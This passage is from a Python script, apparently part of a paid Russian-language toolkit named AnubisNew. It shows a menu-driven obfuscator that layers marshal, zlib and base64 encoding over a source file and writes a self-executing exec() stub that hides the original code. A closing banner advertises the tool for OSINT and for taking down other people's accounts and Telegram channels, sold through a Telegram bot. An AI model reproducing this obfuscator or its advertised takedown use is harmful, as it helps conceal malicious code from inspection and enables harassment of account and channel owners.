        if option == 1:
            xx = "mar(data.encode('utf8'))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__[::-1]);"
        elif option == 2:
            xx = "zlb(data.encode('utf8'))[::-1]"
            heading = "_ = lambda __ : __import__('zlib').decompress(__[::-1]);"
        elif option == 3:
            xx = "b16(data.encode('utf8'))[::-1]"
            heading = "_ = lambda __ : __import__('base64').b16decode(__[::-1]);"
        elif option == 4:
            xx = "b32(data.encode('utf8'))[::-1]"
            heading = "_ = lambda __ : __import__('base64').b32decode(__[::-1]);"
        elif option == 5:
            xx = "b64(data.encode('utf8'))[::-1]"
            heading = "_ = lambda __ : __import__('base64').b64decode(__[::-1]);"
        elif option == 6:
            xx = "b16(zlb(data.encode('utf8')))[::-1]"
            heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));"
        elif option == 7:
            xx = "b32(zlb(data.encode('utf8')))[::-1]"
            heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));"
        elif option == 8:
            xx = "b64(zlb(data.encode('utf8')))[::-1]"
            heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
        elif option == 9:
            xx = "zlb(mar(data.encode('utf8')))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));"
        elif option == 10:
            xx = "b16(mar(data.encode('utf8')))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));"
        elif option == 11:
            xx = "b32(mar(data.encode('utf8')))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));"
        elif option == 12:
            xx = "b64(mar(data.encode('utf8')))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));"
        elif option == 13:
            xx = "b16(zlb(mar(data.encode('utf8'))))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));"
        elif option == 14:
            xx = "b32(zlb(mar(data.encode('utf8'))))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));"
        elif option == 15:
            xx = "b64(zlb(mar(data.encode('utf8'))))[::-1]"
            heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"
        else:
            sys.exit("\n Invalid Option!")

        for _ in range(loop):
            try:
                data = "exec((_)(%s))" % repr(eval(xx))
            except TypeError as s:
                sys.exit("TypeError: " + str(s))

        with open(output, 'w') as f:
            f.write(heading + data)

        FileSize(output)

    def cls():
        input(f'\n\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Press Enter to reload')
        os.system('cls' if os.name == 'nt' else 'clear')
        # subprocess.run(['./AnubisNew.exe'])
        subprocess.run(['python', 'anubisnew.py'])


    # Entry point
    if __name__ == "__main__":
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}1. Marshal')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}2. Zlib')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}3. Base64 (b16)')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}4. Base64 (b32)')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}5. Base64 (b64)')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}6. Base64 (b16) + Zlib')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}7. Base64 (b32) + Zlib')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}8. Base64 (b64) + Zlib')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}9. Zlib + Marshal')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}10. Base64 (b16) + Marshal')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}11. Base64 (b32) + Marshal')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}12. Base64 (b64) + Marshal')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}13. Base64 (b16) + Zlib + Marshal')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}14. Base64 (b32) + Zlib + Marshal')
        print(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}15. Base64 (b64) + Zlib + Marshal')

        try:
            option = int(input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}Enter option {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}'))
            file = input(f'\t    {COLOR_CODE["YELLOW"]}{COLOR_CODE["BOLD"]}[@] {COLOR_CODE["CYAN"]}{COLOR_CODE["BOLD"]}File Name {COLOR_CODE["YELLOW"]}→ {COLOR_CODE["BOLD"]}{COLOR_CODE["CYAN"]}')
            data = open(file, encoding="utf8").read()
            output = file.lower().replace('.py', '') + '_enc.py'
            Encode(option, data, output)
            cls()
        except Exception as e:
            sys.exit(f"Error: {str(e)}")

if choice == '11':
    func11 = '''
    ─────────────────────────→ Информация ←─────────────────────────
                Данная утилита создана не только для OSINT.
             А так же для сноса аккаунтов и телеграмм каналов.
            
                         A-Project development
                    Покупка только в @AkumaMarketBot

                  Приятного пользование AnubisNew Premium.
    ────────────────────────────────────────────────────────────────
    '''

    print(Colorate.Vertical(Colors.green_to_cyan,Center.XCenter(func11)))
    cls()

if choice == '00':
    exit()